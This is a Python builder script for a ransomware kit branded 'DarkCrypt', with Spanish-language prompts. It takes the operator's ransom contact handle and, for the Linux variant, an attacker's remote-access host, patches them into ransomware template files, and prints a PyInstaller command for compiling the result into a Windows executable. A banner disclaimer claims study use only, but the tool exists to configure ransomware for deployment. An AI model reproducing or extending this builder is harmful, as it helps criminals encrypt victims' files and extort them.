#!/usr/bin/env python3
import re
from pystyle import Colorate, Colors
from colorama import Fore
import os
import sys

os.system('cls' if os.name == 'nt' else 'clear')

def modify(file_path, new_user, remote_access_ssh, option):
    # Windows
    if option == 1:
        try:
            with open(file_path, 'r') as file:
                lines = file.readlines()

                user_pattern = re.compile(r"^\s*User\s*=\s*['\"](.*)['\"]\s*$")
                for i, line in enumerate(lines):
                    match = user_pattern.match(line)
                    if match:
                        lines[i] = f"User = '{new_user}'\n"

            with open('encode_ransom.py', 'w') as file:
                file.writelines(lines)
        except Exception as e:
            print(f"Error al manejar el archivo {file_path}: {e}")
    
    # Linux
    elif option == 2:
        try:
            with open(file_path, 'r') as file:
                lines = file.readlines()

            # User
            user_pattern = re.compile(r"^\s*User\s*=\s*['\"](.*)['\"]\s*$")
            # Link
            link_pattern = re.compile(r'^\s*link\s*=\s*.*$')

            for i, line in enumerate(lines):
                user_match = user_pattern.match(line)
                link_match = link_pattern.match(line)

                if user_match:
                    lines[i] = f"User = '{new_user}'\n"
                elif link_match:
                    lines[i] = f"link = '{remote_access_ssh}/user={{username}}'\n"

            with open('encode_ransom.py', 'w') as file:
                file.writelines(lines)

        except Exception as e:
            print(f"Error al manejar el archivo {file_path}: {e}")



def main():
    banner = '''
    8888b.     db    88""Yb 88  dP  dP""b8 88""Yb Yb  dP 88""Yb 888888
     8I  Yb   dPYb   88__dP 88odP  dP   `" 88__dP  YbdP  88__dP   88
     8I  dY  dP__Yb  88"Yb  88"Yb  Yb      88"Yb    8P   88"""    88
    8888Y"  dP""""Yb 88  Yb 88  Yb  YboodP 88  Yb  dP    88       88
                        Created by: 74lg0
                      Windows Ransomware Fake ;)
    '''
    print(Colorate.Horizontal(Colors.green_to_blue, banner))
    print(Fore.RED + "[!] I do not take responsibility for misuse, this ransomware was created for study purposes only.\nI do not control their actions.")
    print(Fore.YELLOW + '[1] Windows\n[2] Linux')
    try:
        option = int(input('Seleccione una opción => '))
        # Windows
        if option == 1:
            file_path = 'RansomCrypt.py'
            new_user = input(Fore.YELLOW + "Contacto de Ransomware Ej: @74lg0, @Hacker, etc. => ")
            modify(file_path, new_user, None, option)
            print(Fore.RED + "¡Utiliza PyInstaller para crear el compilador EXE!\npyinstaller --onefile encode_ransom.py")
       
        # Linux
        elif option == 2:
            file_path = 'RansomCryptLinux.py'
            new_user = input(Fore.YELLOW + "Contacto de Ransomware Ej: @74lg0, @Hacker, etc. => ")
            remote_access_ssh = input('Your Remote Access Host => ')
            modify(file_path, new_user, remote_access_ssh, option)

        else:
            print(Colorate.Horizontal(Colors.green_to_yellow, f'Incorrect option {option}'))

        
    
    except KeyboardInterrupt:
            sys.exit()
    
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f'ERROR {e}'))

if __name__ == "__main__":
    main()
